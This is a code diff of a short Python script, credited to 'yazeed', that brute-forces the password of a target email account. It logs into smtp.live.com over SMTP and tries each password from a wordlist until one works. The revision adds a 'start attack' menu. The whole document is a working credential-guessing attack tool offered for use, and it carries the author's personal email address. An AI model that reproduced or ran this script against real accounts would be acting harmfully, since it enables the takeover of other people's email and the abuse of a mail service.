@@ -1,26 +1,34 @@
-print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
-print("+                                                          +")
-print("+               [!] powered by yazeed [!]                  +")
-print("+           My Email: Bilalyazeed4@gmail.com               +")
-print("+                                                          +")
-print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
+print '+++++++++++++++++++++++++++++++++++++++++-'
+print '|                                        |'
+print '|       [-] created by yazeed33 [-]      |'
+print '|                                        |'
+print '|+++++++++++++++++++++++++++++++++++++++++'
 
 import smtplib
+from os import system
 
-smtpserver = smtplib.SMTP("smtp.live.com",587)
+print("[1] start attack")
+print("[2] exit")
+options = input("--> ")
+
+if options == 1:
+   pass_file = raw_input("path of wordlist file: ")
+
+else:
+ system('clear')
+ exit()
+
+smtpserver = smtplib.SMTP("smtp.live.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
 
-email = raw_input("Enter Email Target: ")
-print("++++++++++++++++++++++++++++++++++++++++")
-passwfile = raw_input("Enter WordList File: ")
-passwfile = open(passwfile,"r")
+user = raw_input('Enter target Email: ')
+pass_file = open(pass_file, 'r')
 
-for password in passwfile:
+for password in pass_file:
     try:
-        smtpserver.login(email,password)
-        print("[+] PASS FOND ===> %s ") % password
+        smtpserver.login(user, password)
+        print("[+] PASS FOUND ------> " + password )
         break;
     except smtplib.SMTPAuthenticationError:
-        print("[!] PASS INCORRECT ===> %s ") % password    
-    
+        print('[-] PASS INCORRECT ------> ' + password )
